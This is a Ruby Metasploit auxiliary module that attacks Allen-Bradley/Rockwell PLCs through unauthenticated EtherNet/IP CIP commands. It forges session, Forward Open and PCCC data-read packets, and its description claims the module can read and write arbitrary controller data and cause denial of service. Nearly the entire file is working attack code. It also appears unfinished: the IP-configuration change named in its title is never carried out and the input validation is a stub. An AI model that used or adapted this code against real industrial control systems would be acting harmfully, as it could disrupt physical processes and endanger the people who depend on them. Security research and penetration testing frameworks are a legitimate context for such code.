##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp
  include Rex::Text

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Change IP Configuration',
      'Description'    => %q{
        The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
        implements the protocol.  This module reads and writes arbitrary data, potentially
        resulting in a DOS condition

        This module is based on the original 'ethernetip-multi.rb' Basecamp module
        from DigitalBond, and the multi_cip_command module.
      },
      'Author'         =>
        [
          'Ruben Santamarta <ruben[at]reversemode.com>',
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb', # Metasploit fixups
          'SeawolfRN' # IP Configuration
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ],
          [ 'URL', 'http://reversemode.com/downloads/logix_report_basecamp.pdf']
        ],
      'DisclosureDate' => 'Jan 19 2012'))

    register_options(
      [
        Opt::RPORT(44818),
        #How the bloody hell do I validate these in metasploit...
        
      ], self.class
    )
  end

  def run
    print_status "#{rhost}:#{rport} - CIP - Reading Data"
    sid = req_session

    if sid
      #FWD_OPEN
      print_status "#{rhost}:#{rport} - CIP - Sending FWD_OPEN Request"
      forge_packet(sid, payload(0),"\x6f\x00")
      data = sock.get_once(1024)
      print_status "Got response"
      #Data Table Read
      forge_packet(sid, payload(1),"\x70\x00")
      data = sock.get_once(1024)
      print_status "Got Response"
      print_status "#{rhost}:#{rport} - CIP - Sending Data Read"
      print_status "#{rhost}:#{rport} - CIP - Attack complete."
    end
  end

  def forge_packet(sessionid, payload, command)
    packet = command # command: Send request/reply data
    packet << [payload.size].pack("v") # encap length (2 bytes)
    packet << [sessionid].pack("N") # session identifier (4 bytes)
    packet << "\x00\x00\x00\x00" #Status: Success (We don't really want failures...)
    packet << "\x00\x00\x00\x01\x00\x18\x1d\xce" #Sender Context
    packet << "\x00\x00\x00\x00" #Options
    packet << payload # Payload

    begin
      sock.put(packet)
    rescue ::Interrupt
      print_error("#{rhost}:#{rport} - CIP - Interrupt during payload")
      raise $!
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
      print_error("#{rhost}:#{rport} - CIP - Network error during payload")
      return nil
    end
  end

  def req_session
    begin
      connect
      packet = ""
      packet += "\x65\x00" # ENCAP_CMD_REGISTERSESSION (2 bytes)
      packet += "\x04\x00" # encaph_length (2 bytes)
      packet += "\x00\x00\x00\x00" # session identifier (4 bytes)
      packet += "\x00\x00\x00\x00" # status code (4 bytes)
      packet += "\x00\x00\x00\x00\x00\x00\x00\x00" # context information (8 bytes)
      packet += "\x00\x00\x00\x00" # options flags (4 bytes)
      packet += "\x01\x00" # proto (2 bytes)
      packet += "\x00\x00" # flags (2 bytes)
      sock.put(packet)
      response = sock.get_once
      if response
        session_id = response[4..8].unpack("N")[0] rescue nil# bare minimum of parsing done
        if session_id
          print_status("#{rhost}:#{rport} - CIP - Got session id: 0x"+session_id.to_s(16))
        else
          print_error("#{rhost}:#{rport} - CIP - Got invalid session id, aborting.")
          return nil
        end
      else
        raise ::Rex::ConnectionTimeout
      end
    rescue ::Interrupt
      print_error("#{rhost}:#{rport} - CIP - Interrupt during session negotation")
      raise $!
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e
      print_error("#{rhost}:#{rport} - CIP - Network error during session negotiation: #{e}")
      return nil
    end
    return session_id
  end

  def cleanup
    disconnect rescue nil
  end

  def byte_encode(datasrc)
    ip = ""
    datastore[datasrc].split('.').each do |sect|
      if Integer(sect) > 255
        #except - fail
      end
      ip << Integer(sect)#.to_s(16)
    end
    return ip
  end

  def payload(stage)
    case stage
      when 0
        #This is a forward open request.
        payload = "\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x30\x00"
        payload << "\x54\x02" #Forward open request
        payload << "\x20\x06\x24\x01" #No idea what this is 
        payload << "\x07\xe8" #Timeout
        payload << "\x00\x00\x04\x80" # O>T Connection ID
        payload << "\x80\x68\x00\x17" # T>O Connection ID
        payload << "\x07\x22" #Connection Serial Number
        payload << "\x01\x00" # Vendor ID (Rockwell automation/ Allen Bradley)
        payload << "\xf2\x0c\x02\x00" # Originator Serial Number
        payload << "\x00\x00\x00\x00" # Reserved
        payload << "\xe0\x70\x72\x00" #O>T RPI
        payload << "\xf6\x43" #O>T Connection parameters
        payload << "\xe0\x70\x72\x00" #T>O RPI
        payload << "\xf6\x43" #T>O Connection Parameters
        payload << "\xa3" #Transport Type
        payload << "\x03" #Connection path size (3 words)
        payload << "\x01\x01\x20\x02\x24\x01" #Connection Path  Port:1 Address 1: Message Router, Instance: 0x01
      when 1
        # This is the Data read request.
        payload = "\x00\x00\x00\x00\x00\x00"
        payload << "\x02\x00" # Generic Data
        payload << "\xa1\x00\x04\x00" # CID To follow
        #payload << "\x80\x60\x00\x7a" # CID
        payload << "\x80\x68\x00\x17" # T>O Connection ID
        payload << "\xb1\x00" # Connected Data Item 
        payload << "\x1e\x00" 
        payload << "\x01\x00" # Sequence count
        payload << "\x4b" # Execute_PCCC
        payload << "\x02\x20\x67\x24\x01"
        payload << "\x07\x01\x00\x42\x00\x1c\xbc"
        payload << "\x0f\x00\xdd\x36\x68" # Typed Read
        payload << "\x00\x00\x08\x00"
        payload << "\x07\x00\x07\x00" # PLC5 Address
        payload << "\x08\x00"
        #payload << "\x02\x00\xa1\x00\x04\x00\x80\x67\x00\x47\xb1\x00"
        #payload << "\x14\x00\x01\x00\x4c\x07\x91\x0b\x72\x65\x61\x64\x5f\x76\x61\x6c\x75\x65\x73\x00\x01\x00"
      else
        print_status("Something's gone wrong")
        payload = "FAILFAILFAIL"
    end

    return payload
  end

end